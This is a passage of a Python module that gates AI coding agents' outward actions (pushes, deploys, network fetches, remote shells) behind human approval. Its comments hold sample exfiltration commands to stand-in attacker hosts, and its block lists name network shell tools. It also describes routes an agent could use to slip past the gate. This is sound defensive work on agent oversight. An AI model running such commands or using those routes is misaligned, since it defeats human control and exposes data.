"""Action gate - the enforcement point for the read+propose posture.

An agent session (Copilot / Claude / Codex driven by the brains executor) runs
freely inside a sandbox worktree: it may read, edit, run local builds/tests, and
make *local* git commits. The moment it tries to cross **outward** - push code,
deploy, change DNS, move money, touch a remote host, or hit the production
network - that action is classified here and handed to :mod:`brains.govern`,
which records it, blocks it behind a human approval, and only then releases the
real binary.

How far this boundary actually reaches
--------------------------------------

Be precise about this, because the difference matters to anyone relying on it:

* **Governed.** Every command Brains itself launches (:mod:`brains.exec.guard`),
  every recurring/autopilot spawn, and every command a shimmed binary name
  resolves to while the agent's ``PATH`` still starts with the shim directory.
  Classification normalises POSIX and Windows paths, absolute paths, executable
  suffixes, wrapper commands (``env``/``sudo``/``timeout``/``xargs``/...),
  shell ``-c`` strings, interpreter ``-c``/``-e`` code, ``python -m`` module
  runs, and remote-code runners (``npx``/``uvx``/``pipx``, and the
  fetch-and-execute shapes of their multiplexed cousins - ``pip install``,
  ``uv pip install``, ``uv tool install``, ``uv run``).
* **Not governed.** A third-party agent CLI that calls an absolute path
  directly, rewrites ``PATH`` to drop the shim directory, opens a raw socket, or
  uses an in-process HTTP client never reaches this module at all. That is a
  process/network sandbox problem, tracked as BL-P0-03. This module refuses to
  imply coverage it does not have: :func:`gate_main` records a
  ``gate.path_mutation`` observation when it is invoked with the shim directory
  no longer on ``PATH``, and ``BRAINS_GATE_MODE=strict`` gates unknown binaries
  so an unrecognised tool is blocked rather than waved through.

Fail-closed
-----------

If the decision or its audit entry cannot be committed, the command is denied.
An outward action never runs on the strength of a record that was not written.

Truthful handoff
----------------

Both tiers run the same governed lifecycle, and the record ends where this
process's knowledge ends. On Windows the real binary is a child, so its exit
status is recorded. On POSIX ``os.execv`` replaces this process, so the last
thing it can honestly record is the handoff itself: the action is settled
``released`` *before* the replacement rather than left ``executing`` for the
stale sweep to call abandoned, and if ``execv`` fails the failure is recorded
because this process is still alive to record it.
"""

from __future__ import annotations

import contextlib
import ipaddress
import os
import re
import shutil
import subprocess
import sys
from collections.abc import Iterable
from dataclasses import dataclass

from brains.govern import (
    TIER_LOCAL,
    TIER_OUTWARD,
    ActionTarget,
    GovernedRequest,
    normalize_args,
)

# --- classification -------------------------------------------------------

# Binaries whose every invocation is outward-by-nature -> always gate.
_ALWAYS_GATE = {
    "vercel",
    "netlify",
    "fly",
    "flyctl",
    "heroku",
    "terraform",
    "pulumi",
    "kubectl",
    "helm",
    "doctl",
    "eb",
    "sam",
    "serverless",
    "sls",
    "twine",  # PyPI upload
    "wrangler",
    "supabase",
    "railway",
    "stripe",
    "cdk",
    "ansible",
    "ansible-playbook",
    "scp",
    "sftp",
    "rsync",
    "ssh",  # remote shells/copies are outward by nature
}

# Binaries gated only for specific outward subcommands. The subcommand is matched
# as a TOKEN ANYWHERE in args (not just the first positional) so flag-prefixed
# forms like ``git -C /repo push`` or ``git --git-dir=x push`` can't slip through.
# Over-gating (a false positive) is safe: the operator simply approves.
_SUBCOMMAND_GATE: dict[str, set[str] | None] = {
    "git": {"push", "push-all"},
    "gh": {"pr", "release", "repo", "api", "workflow", "secret", "gist", "auth"},
    "glab": {"mr", "release", "repo", "api"},
    "aws": None,  # any aws call may mutate cloud -> gate all
    "az": None,
    "gcloud": None,
    "docker": {"push"},
    "podman": {"push"},
    "npm": {"publish"},
    "pnpm": {"publish"},
    "yarn": {"publish"},
    "pip": {"install"},  # pip install can fetch+execute arbitrary remote code
    "pip3": {"install"},
    # ``uv`` is a multiplexer: ``uv publish`` uploads, and ``uv pip install`` /
    # ``uv tool install`` / ``uv tool run`` / ``uv run`` / ``uv add`` / ``uv
    # sync`` / ``uv build`` / ``uv python install`` / ``uv self update`` all
    # fetch code from a registry and execute it (a build backend, a console
    # script, a project's own entrypoint), which is exactly why ``pip install``
    # and ``uvx`` are gated. The gated tokens are the *verbs*, so read-only
    # invocations - ``uv pip list|show|freeze|check|tree``, ``uv tool list|dir``,
    # ``uv python list|find``, ``uv cache dir``, ``uv tree``, ``uv export``,
    # ``uv version`` - stay local.
    "uv": {"publish", "run", "add", "remove", "sync", "install", "upgrade", "update", "build"},
    "uvw": {"publish", "run", "add", "remove", "sync", "install", "upgrade", "update", "build"},
}

# Network fetchers: gate only when the target is NOT local/loopback.
_NET_FETCHERS = {"curl", "wget", "http", "https", "nc", "ncat", "telnet"}

#: The only *names* that are loopback without being a loopback literal.
#: ``localhost`` is reserved for the loopback interface (RFC 6761 6.3) and no
#: resolver may answer it with a routable address, and the same section
#: reserves everything under ``.localhost``. Every other host - including
#: ``0.0.0.0`` and ``host.docker.internal`` - is decided by whatever answers
#: the query, so it is treated as remote and gated.
_LOCAL_HOST_NAMES = frozenset({"localhost"})
_LOCAL_HOST_SUFFIX = ".localhost"


@dataclass(frozen=True)
class _WrapperSpec:
    """How to walk one wrapper's own argument vector to find its payload.

    Scanning for "the first token that names a command we recognise" is not
    safe: a wrapper flag's *value* can itself be a command name, so
    ``sudo -u node curl https://evil.example`` would resolve to ``node`` and
    ``xargs -I sh kubectl apply`` to ``sh`` - both outward actions classified
    local. The payload is therefore found positionally, using the flag grammar
    of the specific wrapper, and anything this grammar cannot account for is
    reported as ambiguous so the caller gates instead of guessing.
    """

    #: Short letters and long flags that consume the following token as a value.
    value_shorts: frozenset[str] = frozenset()
    value_longs: frozenset[str] = frozenset()
    #: Short letters and long flags that consume nothing.
    bool_shorts: frozenset[str] = frozenset()
    bool_longs: frozenset[str] = frozenset()
    #: Flags whose arity or effect we deliberately refuse to guess (optional
    #: arguments, "run this string as a shell command", "do not run a command
    #: at all"). Seeing one makes the whole invocation ambiguous.
    unsafe_shorts: frozenset[str] = frozenset()
    unsafe_longs: frozenset[str] = frozenset()
    #: ``NAME=VALUE`` tokens are environment assignments, not the payload.
    env_assignments: bool = False
    #: ``-5`` style numeric shorthand (``nice -10 make``) consumes nothing.
    numeric_shorthand: bool = False
    #: Positional arguments the wrapper takes before the payload, with a
    #: validator - ``timeout DURATION COMMAND``. A positional that does not
    #: look like what the wrapper expects is ambiguous, not a payload.
    positionals: tuple[str, ...] = ()


def _looks_like_duration(token: str) -> bool:
    body = token[:-1] if token[-1:] in "smhd" else token
    if not body:
        return False
    try:
        return float(body) >= 0
    except ValueError:
        return False


_POSITIONAL_VALIDATORS = {"duration": _looks_like_duration}

#: Commands that run *another* command. Their own flags are parsed with the
#: grammar below and the wrapped command is classified instead, so
#: ``sudo git push`` and ``env FOO=1 timeout 5 git push`` are the same decision
#: as ``git push``.
_WRAPPER_SPECS: dict[str, _WrapperSpec] = {
    "env": _WrapperSpec(
        value_shorts=frozenset("uC"),
        value_longs=frozenset({"--unset", "--chdir", "--block-signal", "--default-signal"}),
        bool_shorts=frozenset("i0v"),
        bool_longs=frozenset({"--ignore-environment", "--null", "--debug"}),
        # ``env -S 'curl https://x'`` re-splits a whole command out of one
        # string; there is no honest way to attribute that to a payload token.
        unsafe_shorts=frozenset("S"),
        unsafe_longs=frozenset({"--split-string"}),
        env_assignments=True,
    ),
    "sudo": _WrapperSpec(
        value_shorts=frozenset("CDghpRrtTUu"),
        value_longs=frozenset(
            {
                "--close-from",
                "--chdir",
                "--group",
                "--host",
                "--prompt",
                "--chroot",
                "--role",
                "--type",
                "--command-timeout",
                "--other-user",
                "--user",
            }
        ),
        bool_shorts=frozenset("ABbEHKknNPSs"),
        bool_longs=frozenset(
            {
                "--askpass",
                "--bell",
                "--background",
                "--preserve-env",
                "--set-home",
                "--remove-timestamp",
                "--reset-timestamp",
                "--non-interactive",
                "--no-update",
                "--preserve-groups",
                "--stdin",
                "--shell",
                "--login",
            }
        ),
        # ``-l``/``-e``/``-v``/``-V`` either take an optional command or run no
        # command at all; the token that follows is not reliably a payload.
        unsafe_shorts=frozenset("elvV"),
        unsafe_longs=frozenset({"--list", "--edit", "--validate", "--version", "--help"}),
        env_assignments=True,
    ),
    "doas": _WrapperSpec(
        value_shorts=frozenset("aCu"),
        bool_shorts=frozenset("Lns"),
    ),
    "nohup": _WrapperSpec(
        unsafe_longs=frozenset({"--help", "--version"}),
    ),
    "nice": _WrapperSpec(
        value_shorts=frozenset("n"),
        value_longs=frozenset({"--adjustment"}),
        unsafe_longs=frozenset({"--help", "--version"}),
        numeric_shorthand=True,
    ),
    "ionice": _WrapperSpec(
        value_shorts=frozenset("cnpPu"),
        value_longs=frozenset({"--class", "--classdata", "--pid", "--pgid", "--uid"}),
        bool_shorts=frozenset("t"),
        bool_longs=frozenset({"--ignore"}),
    ),
    "stdbuf": _WrapperSpec(
        value_shorts=frozenset("ioe"),
        value_longs=frozenset({"--input", "--output", "--error"}),
    ),
    "timeout": _WrapperSpec(
        value_shorts=frozenset("sk"),
        value_longs=frozenset({"--signal", "--kill-after"}),
        bool_shorts=frozenset("fpv"),
        bool_longs=frozenset({"--foreground", "--preserve-status", "--verbose"}),
        positionals=("duration",),
    ),
    "command": _WrapperSpec(bool_shorts=frozenset("pvV")),
    "setsid": _WrapperSpec(
        bool_shorts=frozenset("cfw"),
        bool_longs=frozenset({"--ctty", "--fork", "--wait"}),
    ),
    "unbuffer": _WrapperSpec(bool_shorts=frozenset("p")),
    "xargs": _WrapperSpec(
        value_shorts=frozenset("adEILnPs"),
        value_longs=frozenset(
            {
                "--arg-file",
                "--delimiter",
                "--eof",
                "--max-args",
                "--max-procs",
                "--max-chars",
                "--process-slot-var",
            }
        ),
        bool_shorts=frozenset("0oprtx"),
        bool_longs=frozenset(
            {
                "--null",
                "--open-tty",
                "--interactive",
                "--no-run-if-empty",
                "--verbose",
                "--exit",
            }
        ),
        # GNU ``-i``/``-l``/``-e`` and their long forms take an *optional*
        # argument, so whether the next token is a value or the payload is
        # genuinely undecidable from argv alone.
        unsafe_shorts=frozenset("ile"),
        unsafe_longs=frozenset({"--replace", "--max-lines", "--interactive-replace"}),
    ),
}

_WRAPPERS = frozenset(_WRAPPER_SPECS)

#: Shells and interpreters that can carry a command in an argument. Inline code
#: cannot be parsed reliably, so it is scanned for gated tokens instead - and in
#: ``strict`` mode it is gated outright.
_SHELLS = {"sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "cmd", "powershell", "pwsh"}
_INTERPRETERS = {"python", "python3", "py", "node", "deno", "bun", "perl", "ruby", "php"}
_INLINE_FLAGS = {"-c", "-e", "--eval", "--command", "-command", "/c", "/k"}

#: Runners that fetch and execute code from a remote registry. Always gated:
#: "download and run whatever this name resolves to today" is an outward act.
_REMOTE_RUNNERS = {"npx", "pnpx", "bunx", "uvx", "pipx"}

#: Windows resolves these suffixes from ``PATHEXT``; strip them before matching.
_EXECUTABLE_SUFFIXES = (".exe", ".cmd", ".bat", ".com", ".ps1", ".msi")

#: Depth guard for wrapper/interpreter unwrapping.
_MAX_UNWRAP = 6

# Read-only commands that are always safe - the allowlist consulted in STRICT mode
# so an *unknown* binary is gated rather than allowed.
_LOCAL_ALLOW = {
    "ls",
    "cat",
    "head",
    "tail",
    "grep",
    "rg",
    "find",
    "fd",
    "wc",
    "sort",
    "uniq",
    "cut",
    "awk",
    "sed",
    "tr",
    "echo",
    "printf",
    "pwd",
    "cd",
    "test",
    "true",
    "false",
    "dirname",
    "basename",
    "realpath",
    "readlink",
    "stat",
    "file",
    "diff",
    "cmp",
    "python",
    "python3",
    "node",
    "deno",
    "bun",
    "go",
    "cargo",
    "rustc",
    "java",
    "javac",
    "mvn",
    "gradle",
    "make",
    "cmake",
    "ninja",
    "tsc",
    "ruff",
    "black",
    "mypy",
    "flake8",
    "pytest",
    "jest",
    "vitest",
    "mocha",
    "phpunit",
    "rspec",
    "tox",
    "nox",
    "ruby",
    "perl",
    "php",
    "dotnet",
    "dart",
    "swift",
    "kotlin",
    "scala",
    "mkdir",
    "touch",
    "cp",
    "mv",
    "ln",
    "chmod",
    "chown",
    "tee",
    "xargs",
    "env",
    "which",
    "type",
    "whoami",
    "id",
    "date",
    "sleep",
    "seq",
    "jq",
    "yq",
    "tar",
    "gzip",
    "gunzip",
    "zip",
    "unzip",
    "base64",
    "sha256sum",
    "md5sum",
    "openssl",
    "git",
    "uname",
    "hostname",
    "ps",
    "top",
    "free",
    "df",
    "du",
    "kill",
    "pkill",
    "wait",
}

#: Every name that means "this command can go outward". Used to scan inline
#: interpreter/shell code, where the command is a string rather than argv.
_OUTWARD_TOKENS = _ALWAYS_GATE | set(_SUBCOMMAND_GATE) | _NET_FETCHERS | _REMOTE_RUNNERS


@dataclass
class Decision:
    gate: bool
    action_type: str
    summary: str
    reason: str = ""

    @property
    def tier(self) -> str:
        """The governed-action tier this classification maps onto."""
        return TIER_OUTWARD if self.gate else TIER_LOCAL


def _gate_mode() -> str:
    """``standard`` (denylist outward actions) or ``strict`` (allowlist: gate any
    binary not known-local). Default standard."""
    mode = os.environ.get("BRAINS_GATE_MODE", "standard").strip().lower()
    return "strict" if mode == "strict" else "standard"


def binary_name(binary: str) -> str:
    """Normalise any invocation form to a comparable command name.

    Handles POSIX and Windows separators regardless of the host we run on
    (``C:\\Program Files\\Git\\cmd\\git.EXE`` and ``/usr/bin/git`` both become
    ``git``), quoted paths, and ``PATHEXT`` suffixes.
    """
    name = (binary or "").strip().strip('"').strip("'")
    for separator in ("\\", "/"):
        if separator in name:
            name = name.rsplit(separator, 1)[-1]
    name = name.lower()
    for suffix in _EXECUTABLE_SUFFIXES:
        if name.endswith(suffix):
            return name[: -len(suffix)]
    return name


def _inline_code(name: str, args: list[str]) -> str | None:
    """Return the inline program text carried by ``-c``/``-e``/``/c``, if any.

    Shells accept combined short flags (``bash -lc "..."``) and long forms
    (``--command=...``), so matching only the exact ``-c`` token would leave
    the most common inline bypass unclassified.
    """
    for index, raw in enumerate(args):
        token = raw.lower()
        if token in _INLINE_FLAGS and index + 1 < len(args):
            return args[index + 1]
        if token.startswith("--") and "=" in token:
            flag, _, _value = token.partition("=")
            if flag in _INLINE_FLAGS:
                return raw.partition("=")[2]
            continue
        if (
            name in _SHELLS
            and token.startswith("-")
            and not token.startswith("--")
            and "c" in token[1:]
            and index + 1 < len(args)
        ):
            return args[index + 1]
        if name in _INTERPRETERS and token.startswith("-c") and len(token) > 2:
            return raw[2:]
    return None


def _scan_inline(code: str) -> str | None:
    """Return the first outward token an inline program mentions, if any.

    Inline code is not parsed - a string can build a command from fragments -
    so this is deliberately a conservative *token* scan plus a URL check. It
    catches the realistic bypasses (``sh -c "git push"``,
    ``python -c "os.system('curl https://...')"``) and ``strict`` mode covers
    the rest by gating inline code outright.
    """
    lowered = code.lower()
    separators = "\"'`;|&()<>{}[],=\n\t "
    flattened = "".join(ch if ch not in separators else " " for ch in lowered)
    tokens = flattened.split()
    for raw in tokens:
        if "://" in raw and any(not _is_local_host(host) for host in _hosts_in(raw)):
            return "url"
    for raw in tokens:
        if binary_name(raw) in _OUTWARD_TOKENS:
            return binary_name(raw)
    return None


def _host_of(target: str) -> str:
    """Host portion of a URL remainder or bare ``host[:port][/path]`` token.

    Userinfo is dropped (``user:pw@host``), a bracketed IPv6 literal is
    unwrapped with its port (``[::1]:8080``), and a port is only stripped when
    it is numeric, so a host that merely *contains* a colon is handed on whole
    and judged as itself rather than truncated into something that looks
    loopback.

    A backslash inside the *authority* is not normalised away. Whether a
    fetcher reads ``http://localhost\\@evil.example/`` as the host
    ``localhost`` or as userinfo in front of ``evil.example`` depends on which
    URL parser it uses, so the whole authority is returned as the host: it
    matches no loopback spelling, which gates the ambiguity instead of
    resolving it in the attacker's favour.
    """
    for separator in "/?#":
        target = target.split(separator, 1)[0]
    if "\\" in target:
        return target.strip()
    if "@" in target:
        target = target.rsplit("@", 1)[1]
    if target.startswith("["):
        return target[1:].split("]", 1)[0]
    if target.count(":") == 1:
        head, _, port = target.partition(":")
        if port == "" or port.isdigit():
            target = head
    return target.strip()


def _hosts_in(token: str) -> list[str]:
    """Every host a token names.

    A token can carry more than one (``http://localhost/r?to=https://evil``),
    and each one is checked, so a loopback prefix cannot vouch for a remote
    target hiding further along the string.
    """
    lowered = token.lower()
    hosts: list[str] = []
    start = 0
    while (index := lowered.find("://", start)) >= 0:
        hosts.append(_host_of(lowered[index + 3 :]))
        start = index + 3
    if not hosts:
        hosts.append(_host_of(lowered))
    return [host for host in hosts if host]


def _is_local_host(host: str) -> bool:
    """True only for a loopback *address literal* or a reserved local name.

    "Starts with ``127.``" is a string test, not an address test, and a
    hostname is not an address: ``127.0.0.1.attacker.com`` starts with
    ``127.``, resolves to whatever its owner publishes, and was read as
    loopback - so ``curl http://127.0.0.1.attacker.com/exfil`` ran ungated and
    unrecorded. Locality is therefore decided by parsing:

    * an IPv4/IPv6 *literal* is local exactly when :mod:`ipaddress` says it is
      loopback (``127.0.0.0/8``, ``::1``, and ``::ffff:127.0.0.1``), so extra
      DNS labels after a loopback-looking prefix make it a remote name again;
    * the two reserved names stay: ``localhost`` exactly, and the
      ``.localhost`` suffix, which RFC 6761 6.3 reserves for the loopback
      interface;
    * anything else - including ``0.0.0.0`` and ``host.docker.internal``,
      whose meaning depends on what answers the query - is remote and gated;
    * an *obfuscated* numeric spelling that :mod:`ipaddress` will not parse -
      the integer form ``2130706433``, the hex form ``0x7f000001``, the octal
      form ``0177.0.0.1``, the short form ``127.1`` - is remote too. Which of
      those a given fetcher's resolver accepts, and what it makes of them, is
      a property of that resolver rather than of argv, so the spelling is
      gated instead of decoded on our guess.

    Normalisation is deliberately narrow, because every judgement call here is
    made in the safe direction: case and one trailing root dot are folded, and
    a non-ASCII spelling is *not* mapped to ASCII, because which IDNA profile a
    given fetcher applies is not knowable from argv. An unmapped name simply
    fails to match, which gates it.
    """
    name = host.strip().strip("\"'").lower()
    if name.startswith("[") and name.endswith("]") and len(name) > 2:
        name = name[1:-1]
    if name.endswith("."):
        name = name[:-1]
    if not name or not name.isascii():
        return False
    with contextlib.suppress(ValueError):
        return ipaddress.ip_address(name.partition("%")[0]).is_loopback
    return name in _LOCAL_HOST_NAMES or name.endswith(_LOCAL_HOST_SUFFIX)


#: Fetcher flags that consume the following token. Needed for the same reason
#: wrappers need a flag grammar: without it ``curl -o localhost.html
#: https://evil.example`` reads as "mentions localhost, therefore local".
#: Tables are per-binary because the same letter differs between them
#: (``-O`` takes a value for ``wget`` and none for ``curl``); an unlisted flag
#: is treated as taking none, which can only over-gate.
_FETCHER_VALUE_FLAGS: dict[str, tuple[frozenset[str], frozenset[str]]] = {
    "curl": (
        frozenset("AbcCdDeEFHKmoPQrtTuUwxXyYz"),
        frozenset(
            {
                "--data",
                "--data-raw",
                "--data-binary",
                "--data-urlencode",
                "--form",
                "--form-string",
                "--header",
                "--output",
                "--user",
                "--user-agent",
                "--referer",
                "--request",
                "--proxy",
                "--proxy-user",
                "--cookie",
                "--cookie-jar",
                "--cert",
                "--key",
                "--cacert",
                "--capath",
                "--config",
                "--max-time",
                "--connect-timeout",
                "--retry",
                "--write-out",
                "--upload-file",
                "--unix-socket",
                "--resolve",
                "--interface",
                "--range",
                "--time-cond",
                "--oauth2-bearer",
                "--dump-header",
                "--noproxy",
                "--proxy-header",
                "--proxy-cacert",
                "--proxy-cert",
                "--proxy-key",
                "--url",
                "--proxy1.0",
                "--socks4",
                "--socks4a",
                "--socks5",
                "--socks5-hostname",
                "--preproxy",
                "--connect-to",
                "--doh-url",
                "--dns-servers",
            }
        ),
    ),
    "wget": (
        frozenset("aABDeiIloOpPQRtTUwX"),
        frozenset(
            {
                "--output-document",
                "--output-file",
                "--append-output",
                "--input-file",
                "--header",
                "--user",
                "--password",
                "--user-agent",
                "--referer",
                "--directory-prefix",
                "--tries",
                "--timeout",
                "--wait",
                "--post-data",
                "--post-file",
                "--body-data",
                "--body-file",
                "--ca-certificate",
                "--certificate",
                "--bind-address",
                "--execute",
            }
        ),
    ),
}


#: Flags whose *value* names an endpoint the fetcher will actually connect to,
#: rather than a file, a header or a timeout. A proxy, a SOCKS server, a DoH
#: resolver or a ``--resolve``/``--connect-to`` override decides where the
#: bytes go, so ``curl -x proxy.evil:3128 http://localhost/`` is an outward
#: action even though the URL it prints is loopback. Values are read with the
#: same locality test as a positional target, and a composite value is parsed
#: into its endpoints (see :func:`_flag_endpoints`).
_TARGET_VALUE_FLAGS: dict[str, tuple[frozenset[str], frozenset[str]]] = {
    "curl": (
        frozenset("x"),
        frozenset(
            {
                "--url",
                "--proxy",
                "--proxy1.0",
                "--socks4",
                "--socks4a",
                "--socks5",
                "--socks5-hostname",
                "--preproxy",
                "--resolve",
                "--connect-to",
                "--doh-url",
                "--dns-servers",
            }
        ),
    ),
    # wget has no proxy flag: the proxy is set through ``-e``/``--execute``
    # (``-e http_proxy=http://p:3128``), which is the same redirection.
    "wget": (frozenset("e"), frozenset({"--execute"})),
    "http": (frozenset(), frozenset({"--proxy"})),
    "https": (frozenset(), frozenset({"--proxy"})),
}

#: Flags whose value packs several fields into one token:
#: ``--resolve HOST:PORT:ADDRESS[,ADDRESS]`` and
#: ``--connect-to HOST1:PORT1:HOST2:PORT2``. Only the *address* half is an
#: endpoint; the name half is the thing being overridden.
_COMPOSITE_TARGET_FLAGS = frozenset({"--resolve", "--connect-to"})

#: Values of a settings assignment (``wget -e robots=off``) that carry no host.
_SETTING_BOOLEANS = frozenset({"on", "off", "yes", "no", "true", "false", "0", "1"})

#: Binaries whose argument grammar is ``[options] HOST PORT``, so a numeric
#: token there is unambiguously a port. Everywhere else a bare number is read
#: as an address spelling, because ``curl 2130706433`` fetches a host.
_PORT_POSITIONAL_TOOLS = frozenset({"nc", "ncat", "telnet"})

#: Tokens that are not network targets: an empty token, a POSIX/relative path,
#: a Windows drive path, a Windows device path (``\\?\C:\x``, ``\\.\pipe\x``).
#: A bare number is deliberately *not* here any more: ``curl 2130706433`` is an
#: integer spelling of an address, and reading every digit run as "a port"
#: meant that fetch was never looked at.
_NOT_A_TARGET = re.compile(r"^$|^[.~@/]|^[A-Za-z]:[\\/]|^\\\\[.?]\\")

#: A whole token that is a Windows-relative path (``.\out``, ``..\out``) -
#: matched before the "contains a backslash" ambiguity rule below.
_WINDOWS_RELATIVE_PATH = re.compile(r"^\.{1,2}\\")


def _is_port_number(token: str) -> bool:
    """True for a plain port literal - no leading zero, inside the range."""
    if not token.isdigit() or (len(token) > 1 and token.startswith("0")):
        return False
    return 0 < int(token) <= 65535


def _first_remote(hosts: Iterable[str]) -> str | None:
    """The first host in ``hosts`` that is not loopback, if any."""
    return next((host for host in hosts if not _is_local_host(host)), None)


def _split_endpoint_fields(value: str) -> list[str]:
    """Split a composite value on ``:``, keeping ``[::1]`` literals whole."""
    fields: list[str] = []
    current: list[str] = []
    depth = 0
    for char in value:
        if char == "[":
            depth += 1
        elif char == "]":
            depth = max(0, depth - 1)
        elif char == ":" and depth == 0:
            fields.append("".join(current))
            current = []
            continue
        current.append(char)
    fields.append("".join(current))
    return fields


def _composite_endpoints(flag: str, value: str) -> list[str]:
    """Endpoints a ``--resolve``/``--connect-to`` value really connects to.

    Only the address half counts: ``--resolve example.com:443:127.0.0.1``
    sends the request to loopback, while
    ``--resolve localhost:8000:203.0.113.9`` sends a loopback-looking URL to a
    remote address. A value this grammar cannot account for is returned whole,
    which matches no loopback spelling and therefore gates.
    """
    fields = _split_endpoint_fields(value)
    if flag == "--resolve":
        if value.startswith("-"):
            # ``-host:port`` removes an entry; it names no endpoint.
            return []
        if len(fields) < 3:
            return [value]
        addresses = ":".join(fields[2:])
        found = [address.strip() for address in addresses.split(",") if address.strip()]
        return found or [value]
    if len(fields) != 4:
        return [value]
    # ``HOST1:PORT1:HOST2:PORT2``: an empty HOST2 means "leave it alone", so
    # the URL's own host - checked as a positional - stays the endpoint.
    host = fields[2].strip()
    return [host] if host else []


def _flag_endpoints(flag: str, value: str) -> list[str]:
    """Every host the value of a connection-redirecting flag names."""
    stripped = value.strip().strip("\"'")
    if not stripped:
        return []
    if flag in _COMPOSITE_TARGET_FLAGS:
        return _composite_endpoints(flag, stripped)
    name, separator, rest = stripped.partition("=")
    if separator and "://" not in name:
        # ``wget -e http_proxy=http://p:3128`` redirects through a settings
        # assignment; ``wget -e robots=off`` sets no endpoint at all.
        if not rest or rest.strip().lower() in _SETTING_BOOLEANS:
            return []
        if "://" not in rest and "proxy" not in name.lower():
            return []
        stripped = rest
    return _hosts_in(stripped)


def _is_target_flag(flag: str, shorts: frozenset[str], longs: frozenset[str]) -> bool:
    """True when ``flag`` (``--proxy`` or ``-x``) takes an endpoint value."""
    if flag.startswith("--"):
        return flag in longs
    return len(flag) == 2 and flag[1] in shorts


def _positional_target(name: str, token: str) -> str | None:
    """The non-loopback host a positional fetcher argument names, if any.

    Ordering matters here, and each branch exists because of a shape that got
    through:

    * a token carrying ``://`` is a URL and is judged as one *even when it
      contains a backslash* - skipping every backslash token as "a Windows
      path" meant ``curl "https://evil.example/a\\b"`` was never looked at;
    * a real local path - POSIX, ``C:\\dir``, ``.\\dir``, ``\\\\?\\C:\\dir``,
      ``\\\\.\\pipe\\x`` - names no host;
    * a UNC path names a *server*, so ``\\\\localhost\\share`` is local and
      ``\\\\fileserver\\share`` is not;
    * anything else containing a backslash is a shape this grammar cannot
      account for, and ambiguity gates;
    * a bare number is a port only for ``nc``/``telnet``-style ``HOST PORT``
      grammars, and only when it is a plausible port; otherwise it is an
      integer address spelling and is judged as a host.
    """
    if token == "-":
        return None
    if "://" in token:
        return _first_remote(_hosts_in(token))
    if _NOT_A_TARGET.match(token) or _WINDOWS_RELATIVE_PATH.match(token):
        return None
    if token.startswith("\\\\"):
        server = re.split(r"[\\/]", token[2:], maxsplit=1)[0].strip()
        if not server or _is_local_host(server):
            return None
        return server
    if "\\" in token:
        return token
    if token.isdigit():
        if name in _PORT_POSITIONAL_TOOLS and _is_port_number(token):
            return None
        return None if _is_local_host(token) else token
    return _first_remote(_hosts_in(token))


def _remote_target(name: str, args: list[str]) -> str | None:
    """First non-loopback host a fetcher invocation names, if any.

    Returns ``None`` when every host it names is loopback (or it names none at
    all, as with ``curl --help``). Three kinds of token are read:

    * **positionals** - the URL or bare host being fetched
      (:func:`_positional_target`);
    * **connection-redirecting flag values** - ``-x``/``--proxy``,
      ``--socks5``, ``--preproxy``, ``--resolve``, ``--connect-to``,
      ``--doh-url``, ``wget -e http_proxy=...`` - which say where the bytes go
      regardless of what the URL says, in the ``--flag value``, ``--flag=value``
      and attached-short (``-xproxy:3128``) spellings alike;
    * **every other flag value** - a filename, a header, a timeout - which is
      skipped, so it cannot masquerade as the target.

    An unknown ``--flag=value`` whose value carries a URL is still checked: the
    flag tables cannot be exhaustive, and a URL-shaped value is a target-shaped
    value. Over-gating is the safe direction throughout.
    """
    value_shorts, value_longs = _FETCHER_VALUE_FLAGS.get(name, (frozenset(), frozenset()))
    target_shorts, target_longs = _TARGET_VALUE_FLAGS.get(name, (frozenset(), frozenset()))
    value_shorts |= target_shorts
    value_longs |= target_longs
    pending: str | None = None
    end_of_flags = False
    for token in args:
        if pending is not None:
            flag, pending = pending, None
            if _is_target_flag(flag, target_shorts, target_longs):
                hit = _first_remote(_flag_endpoints(flag, token))
                if hit:
                    return hit
            continue
        if not end_of_flags and token == "--":
            end_of_flags = True
            continue
        if not end_of_flags and token.startswith("-") and token != "-":
            if token.startswith("--"):
                flag, separator, value = token.partition("=")
                flag = flag.lower()
                if not separator:
                    if flag in value_longs:
                        pending = flag
                    continue
                if flag in target_longs:
                    hit = _first_remote(_flag_endpoints(flag, value))
                elif flag in value_longs:
                    hit = None
                else:
                    hit = _first_remote(_hosts_in(value)) if "://" in value else None
                if hit:
                    return hit
                continue
            body = token[1:]
            for index, letter in enumerate(body):
                if letter not in value_shorts:
                    continue
                attached = body[index + 1 :]
                flag = f"-{letter}"
                if not attached:
                    pending = flag
                elif letter in target_shorts:
                    hit = _first_remote(_flag_endpoints(flag, attached))
                    if hit:
                        return hit
                break
            continue
        hit = _positional_target(name, token)
        if hit:
            return hit
    return None


#: Every command name the classifier recognises. A wrapper's payload must
#: resolve to one of these; a wrapper in front of a binary we know nothing about
#: is gated rather than waved through on the wrapper's own reputation.
_KNOWN_COMMANDS = (
    _ALWAYS_GATE
    | set(_SUBCOMMAND_GATE)
    | _NET_FETCHERS
    | _REMOTE_RUNNERS
    | _SHELLS
    | _INTERPRETERS
    | set(_WRAPPERS)
    | _LOCAL_ALLOW
)

_ENV_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


@dataclass
class _Unwrapped:
    """Result of peeling wrappers off an invocation."""

    name: str
    args: list[str]
    #: Non-empty when the payload could not be identified honestly. The caller
    #: gates on it - ambiguity is never resolved in favour of "probably local".
    ambiguity: str = ""


def _consume_flag(token: str, spec: _WrapperSpec) -> tuple[str, bool]:
    """Classify one flag token of a wrapper.

    Returns ``(ambiguity, takes_next)``. ``takes_next`` means the following
    token is this flag's value and is therefore not the payload. Clustered
    short flags (``-it``, ``-n1``, ``-so out``) are walked letter by letter and
    only accepted while every letter's arity is known.
    """
    if token.startswith("--"):
        flag, sep, _value = token.partition("=")
        if flag in spec.unsafe_longs:
            return f"{flag} has no decidable payload", False
        if flag in spec.value_longs:
            return "", not sep
        if flag in spec.bool_longs:
            return "", False
        return f"unknown flag {flag}", False

    letters = token[1:]
    if spec.numeric_shorthand and re.fullmatch(r"[+-]?\d+", letters):
        return "", False
    for index, letter in enumerate(letters):
        if letter in spec.unsafe_shorts:
            return f"-{letter} has no decidable payload", False
        if letter in spec.value_shorts:
            # The remainder of the cluster is this flag's attached value
            # (``-n1``); an empty remainder means the value is the next token.
            return "", index == len(letters) - 1
        if letter in spec.bool_shorts:
            continue
        return f"unknown flag -{letter}", False
    return "", False


def _wrapper_payload_index(spec: _WrapperSpec, args: list[str]) -> tuple[int | None, str]:
    """Index of the wrapped command in ``args``, or an ambiguity reason.

